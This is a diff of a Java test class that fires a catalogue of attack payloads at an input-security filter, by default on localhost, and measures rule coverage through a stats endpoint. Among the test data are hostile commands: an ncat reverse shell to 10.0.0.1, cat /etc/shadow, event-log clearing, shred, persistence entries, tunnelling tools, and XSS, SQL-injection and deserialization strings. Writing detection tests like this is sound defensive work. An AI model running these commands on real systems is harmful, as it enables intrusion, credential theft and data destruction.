@@ -11,14 +11,42 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
 import java.util.*;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 @DisplayName("Remote Server Security Test - Attack Chain")
 class RemoteServerTest {
 
-    private static final String BASE_URL = "http://47.110.124.183";
-    private static final String LOG_FILE = "remote-attack-results.log";
+    private static final String BASE_URL = System.getProperty("remote.test.base-url", "http://127.0.0.1:9090");
+    private static final String LOG_FILE = System.getProperty("remote.test.log-file", "local-attack-results.log");
+    private static final String STATS_URL = BASE_URL + "/input-security-api/stats";
     private static final ObjectMapper objectMapper = new ObjectMapper();
     private static final List<Map<String, Object>> attackResults = new ArrayList<>();
+    private static final Set<String> ENGINE_RULES = new HashSet<>(Arrays.asList(
+            "xss-attack",
+            "sql-injection",
+            "code-execution",
+            "command-injection",
+            "ssrf-attack",
+            "path-traversal",
+            "ldap-injection",
+            "xxe-injection",
+            "template-injection",
+            "deserialization-attack",
+            "nosql-injection",
+            "installation-attack",
+            "c2-communication",
+            "actions-on-objectives"
+    ));
+    private static final Pattern BLOCK_RULE_PATTERN = Pattern.compile(
+            "Input blocked by security rule:\\s*([a-zA-Z0-9\\-]+)"
+    );
+    private static final int STATS_POLL_TIMEOUT_MS = Integer.getInteger("remote.test.stats-timeout-ms", 1600);
+    private static final int STATS_POLL_INTERVAL_MS = Integer.getInteger("remote.test.stats-interval-ms", 120);
+    private static Integer beforeServerTotalEvents = null;
+    private static Integer afterServerTotalEvents = null;
+    private static Map<String, Integer> beforeServerRuleCounts = null;
+    private static Map<String, Integer> afterServerRuleCounts = null;
 
     private static final String[] IP_POOL = {
         "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
@@ -49,12 +77,27 @@ class RemoteServerTest {
         System.out.println("       Remote Server Security Test - Attack Chain          ");
         System.out.println("       Target: " + BASE_URL);
         System.out.println("============================================================");
+        beforeServerTotalEvents = fetchServerTotalEvents();
+        beforeServerRuleCounts = fetchServerRuleCounts();
+        if (beforeServerTotalEvents != null) {
+            System.out.println("Server totalEvents (before): " + beforeServerTotalEvents);
+        } else {
+            System.out.println("Server totalEvents (before): unavailable");
+        }
+        if (beforeServerRuleCounts == null) {
+            System.out.println("Server typeDistribution (before): unavailable");
+        } else {
+            System.out.println("Server typeDistribution (before): loaded");
+        }
     }
 
     @AfterAll
     static void tearDown() throws Exception {
+        afterServerTotalEvents = fetchServerTotalEvents();
+        afterServerRuleCounts = fetchServerRuleCounts();
         saveAttackResults();
         printAttackSummary();
+        enforceEngineRuleCoverage();
     }
 
     private static void saveAttackResults() throws Exception {
@@ -72,29 +115,145 @@ class RemoteServerTest {
         System.out.println("                   Attack Summary                          ");
         System.out.println("============================================================");
 
-        Map<String, Integer> ruleCounts = new HashMap<>();
-        int totalAttacks = 0;
-        int blockedAttacks = 0;
+        Map<String, Integer> expectedRuleCounts = new HashMap<>();
+        Map<String, Integer> detectedRuleCounts = new HashMap<>();
+        int totalCases = attackResults.size();
+        int sentRequests = 0;
+        int requestErrors = 0;
+        int expectedDetectable = 0;
+        int blockedByStatus = 0;
+        int detectedByStats = 0;
+        int matchedTotal = 0;
+        int potentialMisses = 0;
+        List<String> missCases = new ArrayList<>();
 
         for (Map<String, Object> result : attackResults) {
-            String rule = (String) result.get("rule");
-            if (rule != null) {
-                ruleCounts.put(rule, ruleCounts.getOrDefault(rule, 0) + 1);
+            String expectedRule = (String) result.get("expected_rule");
+            if (expectedRule != null) {
+                expectedRuleCounts.put(expectedRule, expectedRuleCounts.getOrDefault(expectedRule, 0) + 1);
             }
-            totalAttacks++;
-            if (Boolean.TRUE.equals(result.get("blocked"))) {
-                blockedAttacks++;
+
+            if (Boolean.TRUE.equals(result.get("request_sent"))) {
+                sentRequests++;
+            } else {
+                requestErrors++;
+            }
+
+            if (Boolean.TRUE.equals(result.get("expected_detectable"))) {
+                expectedDetectable++;
+            }
+
+            if (Boolean.TRUE.equals(result.get("blocked_by_status"))) {
+                blockedByStatus++;
+            }
+
+            if (Boolean.TRUE.equals(result.get("detected_by_stats"))) {
+                detectedByStats++;
+            }
+
+            if (Boolean.TRUE.equals(result.get("matched"))) {
+                matchedTotal++;
+                String detectedRule = (String) result.get("detected_rule");
+                if (detectedRule != null) {
+                    detectedRuleCounts.put(detectedRule, detectedRuleCounts.getOrDefault(detectedRule, 0) + 1);
+                }
+            }
+
+            if (Boolean.TRUE.equals(result.get("request_sent"))
+                    && Boolean.TRUE.equals(result.get("expected_detectable"))
+                    && !Boolean.TRUE.equals(result.get("matched"))) {
+                potentialMisses++;
+                missCases.add((String) result.get("test_name"));
             }
         }
 
-        System.out.println("\nAttack Type Statistics:");
-        ruleCounts.forEach((rule, count) -> {
+        System.out.println("\nExpected Rule Statistics (from test input):");
+        expectedRuleCounts.forEach((rule, count) -> {
             System.out.println("  - " + rule + ": " + count + " times");
         });
 
-        System.out.println("\nTotal Attacks: " + totalAttacks);
-        System.out.println("Blocked: " + blockedAttacks + " (" +
-                (totalAttacks > 0 ? String.format("%.1f", blockedAttacks * 100.0 / totalAttacks) : 0) + "%)");
+        System.out.println("\nDetected Rule Statistics (403 or stats delta):");
+        if (detectedRuleCounts.isEmpty()) {
+            System.out.println("  - none");
+        } else {
+            detectedRuleCounts.forEach((rule, count) ->
+                    System.out.println("  - " + rule + ": " + count + " times")
+            );
+        }
+
+        System.out.println("\nTotal Cases: " + totalCases);
+        System.out.println("Requests Sent: " + sentRequests);
+        System.out.println("Request Errors: " + requestErrors);
+        System.out.println("Expected Detectable (rule + transport): " + expectedDetectable);
+        System.out.println("Blocked by 403: " + blockedByStatus + " (" +
+                (sentRequests > 0 ? String.format("%.1f", blockedByStatus * 100.0 / sentRequests) : 0) + "%)");
+        System.out.println("Detected by Stats Delta: " + detectedByStats);
+        System.out.println("Matched Total (403 + stats): " + matchedTotal);
+        System.out.println("Potential Misses (sent + expected-detectable but not matched): " + potentialMisses);
+
+        if (!missCases.isEmpty()) {
+            System.out.println("Potential Miss Case Examples:");
+            int max = Math.min(20, missCases.size());
+            for (int i = 0; i < max; i++) {
+                System.out.println("  - " + missCases.get(i));
+            }
+            if (missCases.size() > max) {
+                System.out.println("  - ... and " + (missCases.size() - max) + " more");
+            }
+        }
+
+        if (beforeServerTotalEvents != null && afterServerTotalEvents != null) {
+            int delta = afterServerTotalEvents - beforeServerTotalEvents;
+            System.out.println("\nServer totalEvents (before -> after): "
+                    + beforeServerTotalEvents + " -> " + afterServerTotalEvents + " (delta=" + delta + ")");
+        } else {
+            System.out.println("\nServer totalEvents delta: unavailable (stats endpoint not reachable)");
+        }
+
+        if (beforeServerRuleCounts != null && afterServerRuleCounts != null) {
+            System.out.println("\nEngine Rule Coverage (stats delta):");
+            List<String> sortedRules = new ArrayList<>(ENGINE_RULES);
+            Collections.sort(sortedRules);
+            int coveredRules = 0;
+            for (String rule : sortedRules) {
+                int before = beforeServerRuleCounts.getOrDefault(rule, 0);
+                int after = afterServerRuleCounts.getOrDefault(rule, 0);
+                int delta = Math.max(0, after - before);
+                if (delta > 0) {
+                    coveredRules++;
+                }
+                System.out.println("  - " + rule + ": before=" + before + ", after=" + after + ", delta=" + delta);
+            }
+            System.out.println("Engine Rules Covered: " + coveredRules + "/" + ENGINE_RULES.size());
+        } else {
+            System.out.println("\nEngine Rule Coverage: unavailable (stats endpoint not reachable)");
+        }
+    }
+
+    private static void enforceEngineRuleCoverage() {
+        boolean requireAllRules = Boolean.parseBoolean(
+                System.getProperty("remote.test.require-all-engine-rules", "true")
+        );
+        if (!requireAllRules) {
+            return;
+        }
+        if (beforeServerRuleCounts == null || afterServerRuleCounts == null) {
+            System.out.println("Skip coverage assertion: stats endpoint unavailable");
+            return;
+        }
+
+        List<String> uncovered = new ArrayList<>();
+        for (String rule : ENGINE_RULES) {
+            int before = beforeServerRuleCounts.getOrDefault(rule, 0);
+            int after = afterServerRuleCounts.getOrDefault(rule, 0);
+            if (after - before <= 0) {
+                uncovered.add(rule);
+            }
+        }
+
+        if (!uncovered.isEmpty()) {
+            throw new AssertionError("Engine rules not matched in monitor mode: " + uncovered);
+        }
     }
 
     private Map<String, Object> executeAttack(String testName, String attackType, String rule,
@@ -103,7 +262,7 @@ class RemoteServerTest {
         Map<String, Object> result = new LinkedHashMap<>();
         result.put("test_name", testName);
         result.put("attack_type", attackType);
-        result.put("rule", rule);
+        result.put("expected_rule", rule);
         result.put("ts", System.currentTimeMillis());
         result.put("url", fullUrl);
 
@@ -123,6 +282,11 @@ class RemoteServerTest {
             allHeaders.put("X-Forwarded-For", getNextIp());
             allHeaders.put("X-Real-IP", getNextIp());
             allHeaders.put("Client-IP", getNextIp());
+
+            boolean expectedDetectable = isExpectedDetectable(rule, allHeaders);
+            result.put("expected_detectable", expectedDetectable);
+            Integer ruleCountBefore = expectedDetectable ? fetchServerRuleCount(rule) : null;
+            result.put("rule_count_before", ruleCountBefore);
 
             for (Map.Entry<String, String> entry : allHeaders.entrySet()) {
                 conn.setRequestProperty(entry.getKey(), entry.getValue());
@@ -162,22 +326,44 @@ class RemoteServerTest {
 
             result.put("status_code", statusCode);
             result.put("response_length", responseBody.length());
+            result.put("response_preview", truncate(responseBody, 160));
+            result.put("request_sent", true);
 
-            boolean blocked = statusCode == 403 ||
-                    responseBody.contains("blocked") ||
-                    responseBody.contains("security") ||
-                    responseBody.contains("xss") ||
-                    responseBody.contains("sql") ||
-                    responseBody.contains("injection");
-            result.put("blocked", blocked);
+            boolean blockedByStatus = statusCode == 403;
+            String detectedRule = extractDetectedRule(responseBody);
+            Integer ruleCountAfter = ruleCountBefore;
+            boolean hitByStats = false;
+            if (expectedDetectable && !blockedByStatus && ruleCountBefore != null) {
+                ruleCountAfter = waitForRuleCountIncrease(rule, ruleCountBefore);
+                hitByStats = ruleCountAfter != null && ruleCountAfter > ruleCountBefore;
+                if (hitByStats && detectedRule == null) {
+                    detectedRule = rule;
+                }
+            }
+            boolean matched = blockedByStatus || hitByStats;
+            result.put("blocked_by_status", blockedByStatus);
+            result.put("detected_by_stats", hitByStats);
+            result.put("rule_count_after", ruleCountAfter);
+            result.put("matched", matched);
+            result.put("detected_rule", detectedRule);
 
-            String summary = blocked ? "[BLOCKED]" : "[PASSED]";
-            System.out.println("[" + summary + "] " + testName + " -> Status: " + statusCode);
+            String summary = matched ? "[MATCHED]" : "[MISS]";
+            if (detectedRule != null) {
+                System.out.println("[" + summary + "] " + testName + " -> Status: " + statusCode + ", Rule: " + detectedRule);
+            } else {
+                System.out.println("[" + summary + "] " + testName + " -> Status: " + statusCode);
+            }
 
             attackResults.add(result);
             return result;
 
         } catch (Exception e) {
+            result.put("request_sent", false);
+            result.put("blocked_by_status", false);
+            result.put("detected_by_stats", false);
+            result.put("matched", false);
+            result.put("detected_rule", null);
+            result.put("expected_detectable", isExpectedDetectable(rule, headers));
             result.put("error", e.getMessage());
             System.out.println("[ERROR] " + testName + ": " + e.getMessage());
             attackResults.add(result);
@@ -187,6 +373,151 @@ class RemoteServerTest {
                 conn.disconnect();
             }
         }
+    }
+
+    private static Integer fetchServerTotalEvents() {
+        HttpURLConnection conn = null;
+        try {
+            conn = (HttpURLConnection) new URL(STATS_URL).openConnection();
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(3000);
+            conn.setReadTimeout(3000);
+            int code = conn.getResponseCode();
+            if (code != 200) {
+                return null;
+            }
+
+            try (InputStream is = conn.getInputStream()) {
+                @SuppressWarnings("unchecked")
+                Map<String, Object> data = objectMapper.readValue(is, Map.class);
+                Object value = data.get("totalEvents");
+                if (value instanceof Number) {
+                    return ((Number) value).intValue();
+                }
+                return null;
+            }
+        } catch (Exception e) {
+            return null;
+        } finally {
+            if (conn != null) {
+                conn.disconnect();
+            }
+        }
+    }
+
+    private static Map<String, Integer> fetchServerRuleCounts() {
+        HttpURLConnection conn = null;
+        try {
+            conn = (HttpURLConnection) new URL(STATS_URL).openConnection();
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(3000);
+            conn.setReadTimeout(3000);
+            int code = conn.getResponseCode();
+            if (code != 200) {
+                return null;
+            }
+
+            try (InputStream is = conn.getInputStream()) {
+                @SuppressWarnings("unchecked")
+                Map<String, Object> data = objectMapper.readValue(is, Map.class);
+                Object distribution = data.get("typeDistribution");
+                if (!(distribution instanceof List)) {
+                    return new HashMap<>();
+                }
+
+                Map<String, Integer> counts = new HashMap<>();
+                for (Object itemObj : (List<?>) distribution) {
+                    if (!(itemObj instanceof Map)) {
+                        continue;
+                    }
+                    Map<?, ?> item = (Map<?, ?>) itemObj;
+                    Object nameObj = item.get("name");
+                    Object valueObj = item.get("value");
+                    if (nameObj instanceof String && valueObj instanceof Number) {
+                        counts.put((String) nameObj, ((Number) valueObj).intValue());
+                    }
+                }
+                return counts;
+            }
+        } catch (Exception e) {
+            return null;
+        } finally {
+            if (conn != null) {
+                conn.disconnect();
+            }
+        }
+    }
+
+    private static Integer fetchServerRuleCount(String rule) {
+        Map<String, Integer> ruleCounts = fetchServerRuleCounts();
+        if (ruleCounts == null) {
+            return null;
+        }
+        return ruleCounts.getOrDefault(rule, 0);
+    }
+
+    private static Integer waitForRuleCountIncrease(String rule, int beforeCount) {
+        int interval = Math.max(20, STATS_POLL_INTERVAL_MS);
+        int timeout = Math.max(interval, STATS_POLL_TIMEOUT_MS);
+        long deadline = System.currentTimeMillis() + timeout;
+        Integer latestCount = beforeCount;
+
+        while (System.currentTimeMillis() <= deadline) {
+            Integer currentCount = fetchServerRuleCount(rule);
+            if (currentCount != null) {
+                latestCount = currentCount;
+                if (currentCount > beforeCount) {
+                    return currentCount;
+                }
+            }
+            try {
+                Thread.sleep(interval);
+            } catch (InterruptedException interruptedException) {
+                Thread.currentThread().interrupt();
+                break;
+            }
+        }
+        return latestCount;
+    }
+
+    private static boolean isExpectedDetectable(String rule, Map<String, String> headers) {
+        if (!ENGINE_RULES.contains(rule)) {
+            return false;
+        }
+        if (headers != null) {
+            String contentType = headers.get("Content-Type");
+            if (contentType != null && contentType.toLowerCase(Locale.ROOT).contains("multipart/form-data")) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    private static String extractDetectedRule(String responseBody) {
+        if (responseBody == null || responseBody.isEmpty()) {
+            return null;
+        }
+        Matcher matcher = BLOCK_RULE_PATTERN.matcher(responseBody);
+        if (matcher.find()) {
+            return matcher.group(1);
+        }
+
+        for (String rule : ENGINE_RULES) {
+            if (responseBody.contains(rule)) {
+                return rule;
+            }
+        }
+        return null;
+    }
+
+    private static String truncate(String value, int maxLen) {
+        if (value == null) {
+            return "";
+        }
+        if (value.length() <= maxLen) {
+            return value;
+        }
+        return value.substring(0, maxLen) + "...";
     }
 
     private Map<String, Object> executeGet(String testName, String attackType, String rule, String url) {
@@ -381,6 +712,27 @@ class RemoteServerTest {
     }
 
     @Test
+    @DisplayName("Delivery - NoSQL Injection")
+    void testDeliveryNosqlInjection() {
+        String[] payloads = {
+            "{\"$ne\":null}",
+            "{\"$where\":\"this.password.length > 0\"}",
+            "{\"$regex\":\".*\"}",
+            "{\"$gt\":\"\"}",
+            "{\"$expr\":{\"$eq\":[1,1]}}"
+        };
+        String[] names = {"NE_NULL", "WHERE_JS", "REGEX_ANY", "GT_EMPTY", "EXPR_EQ"};
+        for (int i = 0; i < payloads.length; i++) {
+            try {
+                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
+                executeGet("NoSQL-" + names[i], "delivery", "nosql-injection", BASE_URL + "/login?username=" + encodedPayload);
+            } catch (Exception e) {
+                System.out.println("[ERROR] NoSQL: " + e.getMessage());
+            }
+        }
+    }
+
+    @Test
     @DisplayName("Delivery - SSRF Attack")
     void testDeliverySsrf() {
         String[] payloads = {
@@ -455,7 +807,7 @@ class RemoteServerTest {
         };
         String[] names = {"PASSWD", "SHADOW", "EXTERNAL"};
         for (int i = 0; i < payloads.length; i++) {
-            executePost("XXE-" + names[i], "exploitation", "xxe-attack", BASE_URL + "/xml", payloads[i], "application/xml");
+            executePost("XXE-" + names[i], "exploitation", "xxe-injection", BASE_URL + "/xml", payloads[i], "application/xml");
         }
     }
 
@@ -504,7 +856,44 @@ class RemoteServerTest {
         }
     }
 
-    // ==================== Installation - 5 tests ====================
+    @Test
+    @DisplayName("Exploitation - Code Execution")
+    void testExploitationCodeExecution() {
+        String[] payloads = {
+            "eval(alert(1))",
+            "system('id')",
+            "Class.forName('java.lang.Runtime')",
+            "${runtime.exec('id')}",
+            "setTimeout(alert(1),1000)"
+        };
+        String[] names = {"EVAL", "SYSTEM", "CLASS_FORNAME", "RUNTIME_EXEC", "SET_TIMEOUT"};
+        for (int i = 0; i < payloads.length; i++) {
+            try {
+                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
+                executeGet("CodeExec-" + names[i], "exploitation", "code-execution", BASE_URL + "/script?expr=" + encodedPayload);
+            } catch (Exception e) {
+                System.out.println("[ERROR] CodeExec: " + e.getMessage());
+            }
+        }
+    }
+
+    @Test
+    @DisplayName("Exploitation - Deserialization Attack")
+    void testExploitationDeserialization() {
+        String[] payloads = {
+            "rO0ABXNyABFqYXZhLnV0aWwuQXJyYXlMaXN0eHAAAAABdwQAAAABdAAEVEVTVHg=",
+            "aced0005737200116a6176612e7574696c2e486173684d6170",
+            "O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}",
+            "!!python/object/apply:os.system ['id']"
+        };
+        String[] names = {"JAVA_BASE64", "JAVA_MAGIC", "PHP_OBJECT", "PY_OBJECT"};
+        for (int i = 0; i < payloads.length; i++) {
+            executePost("Deser-" + names[i], "exploitation", "deserialization-attack",
+                    BASE_URL + "/deserialize", payloads[i], "text/plain");
+        }
+    }
+
+    // ==================== Installation - 10 tests ====================
 
     @Test
     @DisplayName("Installation - File Upload")
@@ -528,8 +917,75 @@ class RemoteServerTest {
                     "<malicious_code/>\r\n" +
                     "------WebKitFormBoundary--\r\n";
 
-            executePost("Upload-" + filenames[i], "installation", "file-upload",
+            executePost("Upload-" + filenames[i], "installation", "installation-attack",
                     BASE_URL + "/upload", body, "multipart/form-data; boundary=----WebKitFormBoundary");
+        }
+    }
+
+    @Test
+    @DisplayName("Installation - Persistence Behavior")
+    void testInstallationPersistenceBehavior() {
+        String[] payloads = {
+            "crontab -e",
+            "schtasks /create /tn backdoor",
+            "/etc/cron.daily/evil.sh",
+            "~/.ssh/authorized_keys",
+            "REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        };
+        String[] names = {"CRONTAB", "SCHTASKS", "CRON_DAILY", "AUTHORIZED_KEYS", "REG_ADD"};
+        for (int i = 0; i < payloads.length; i++) {
+            try {
+                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
+                executeGet("Install-" + names[i], "installation", "installation-attack",
+                        BASE_URL + "/setup?cmd=" + encodedPayload);
+            } catch (Exception e) {
+                System.out.println("[ERROR] Installation: " + e.getMessage());
+            }
+        }
+    }
+
+    // ==================== C2 + Actions - 20 tests ====================
+
+    @Test
+    @DisplayName("Command Control - C2 Communication")
+    void testCommandControlC2Communication() {
+        String[] payloads = {
+            "frpc -c /tmp/frpc.ini",
+            "ngrok tcp 3389",
+            "chisel client 1.2.3.4:80 R:socks",
+            "ew_for_linux -s ssocksd -l 1080",
+            "ncat 10.0.0.1 -e /bin/sh"
+        };
+        String[] names = {"FRPC", "NGROK", "CHISEL", "EW", "NCAT_E"};
+        for (int i = 0; i < payloads.length; i++) {
+            try {
+                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
+                executeGet("C2-" + names[i], "command_control", "c2-communication", BASE_URL + "/agent?task=" + encodedPayload);
+            } catch (Exception e) {
+                System.out.println("[ERROR] C2: " + e.getMessage());
+            }
+        }
+    }
+
+    @Test
+    @DisplayName("Actions - Objectives Behaviors")
+    void testActionsOnObjectives() {
+        String[] payloads = {
+            "mysqldump -u root -p123 --all-databases",
+            "cat /etc/shadow",
+            "wevtutil cl Security",
+            "shred /var/data.db",
+            "dd if=/dev/zero of=/tmp/disk.img"
+        };
+        String[] names = {"MYSQLDUMP", "CAT_SHADOW", "WEVTUTIL", "SHRED", "DD_ZERO"};
+        for (int i = 0; i < payloads.length; i++) {
+            try {
+                String encodedPayload = URLEncoder.encode(payloads[i], "UTF-8");
+                executeGet("ActionObj-" + names[i], "actions", "actions-on-objectives",
+                        BASE_URL + "/ops?action=" + encodedPayload);
+            } catch (Exception e) {
+                System.out.println("[ERROR] ActionsObj: " + e.getMessage());
+            }
         }
     }
 
@@ -545,9 +1001,23 @@ class RemoteServerTest {
             "cb=eval(document.cookie)",
             "jQuery123456789=alert(1)"
         };
+        String[] expectedRules = {
+            "unknown",
+            "unknown",
+            "xss-attack",
+            "code-execution",
+            "unknown"
+        };
         String[] names = {"CALLBACK", "JSONP_FUNC", "SCRIPT_TAG", "EVAL_COOKIE", "JQUERY"};
         for (int i = 0; i < payloads.length; i++) {
-            executeGet("JSONP-" + names[i], "actions", "jsonp-attack", BASE_URL + "/api?" + payloads[i]);
+            try {
+                String[] pair = payloads[i].split("=", 2);
+                String key = pair[0];
+                String value = pair.length > 1 ? URLEncoder.encode(pair[1], "UTF-8") : "";
+                executeGet("JSONP-" + names[i], "actions", expectedRules[i], BASE_URL + "/api?" + key + "=" + value);
+            } catch (Exception e) {
+                System.out.println("[ERROR] JSONP-" + names[i] + ": " + e.getMessage());
+            }
         }
     }
 
@@ -570,23 +1040,43 @@ class RemoteServerTest {
     @Test
     @DisplayName("Additional - Additional Attack Vectors")
     void testAdditionalVectors() {
-        // Test different parameters
-        String[] testCases = {
-            BASE_URL + "/search?q=<script>alert(1)</script>",
-            BASE_URL + "/query?name=test' OR '1'='1",
-            BASE_URL + "/user?id=1 UNION SELECT * FROM admin",
-            BASE_URL + "/view?file=../../../../etc/passwd",
-            BASE_URL + "/render?template=${7*7}",
-            BASE_URL + "/api/getData?data=<img src=x onerror=alert(1)>",
-            BASE_URL + "/profile?username=admin'--",
-            BASE_URL + "/comment?text=<svg onload=alert(1)>",
-            BASE_URL + "/upload?file=shell.jsp",
-            BASE_URL + "/download?path=../../../windows/win.ini"
+        String[] names = {
+            "SEARCH_XSS", "QUERY_SQL", "USER_SQL", "VIEW_PATH", "RENDER_SSTI",
+            "DATA_XSS", "PROFILE_SQL", "COMMENT_XSS", "UPLOAD_FILE", "DOWNLOAD_PATH"
         };
-        String[] names = {"SEARCH_XSS", "QUERY_SQL", "USER_SQL", "VIEW_PATH", "RENDER_SSTI", "DATA_XSS", "PROFILE_SQL", "COMMENT_XSS", "UPLOAD_FILE", "DOWNLOAD_PATH"};
+        String[] paths = {
+            "/search", "/query", "/user", "/view", "/render",
+            "/api/getData", "/profile", "/comment", "/upload", "/download"
+        };
+        String[] params = {
+            "q", "name", "id", "file", "template",
+            "data", "username", "text", "file", "path"
+        };
+        String[] values = {
+            "<script>alert(1)</script>",
+            "test' OR '1'='1",
+            "1 UNION SELECT * FROM admin",
+            "../../../../etc/passwd",
+            "${7*7}",
+            "<img src=x onerror=alert(1)>",
+            "admin'--",
+            "<svg onload=alert(1)>",
+            "shell.jsp",
+            "../../../windows/win.ini"
+        };
+        String[] expectedRules = {
+            "xss-attack", "sql-injection", "sql-injection", "path-traversal", "template-injection",
+            "xss-attack", "sql-injection", "xss-attack", "unknown", "path-traversal"
+        };
 
-        for (int i = 0; i < testCases.length; i++) {
-            executeGet("Add-" + names[i], "delivery", "multi-vector", testCases[i]);
+        for (int i = 0; i < names.length; i++) {
+            try {
+                String encoded = URLEncoder.encode(values[i], "UTF-8");
+                String url = BASE_URL + paths[i] + "?" + params[i] + "=" + encoded;
+                executeGet("Add-" + names[i], "delivery", expectedRules[i], url);
+            } catch (Exception e) {
+                System.out.println("[ERROR] Additional-" + names[i] + ": " + e.getMessage());
+            }
         }
     }
 }
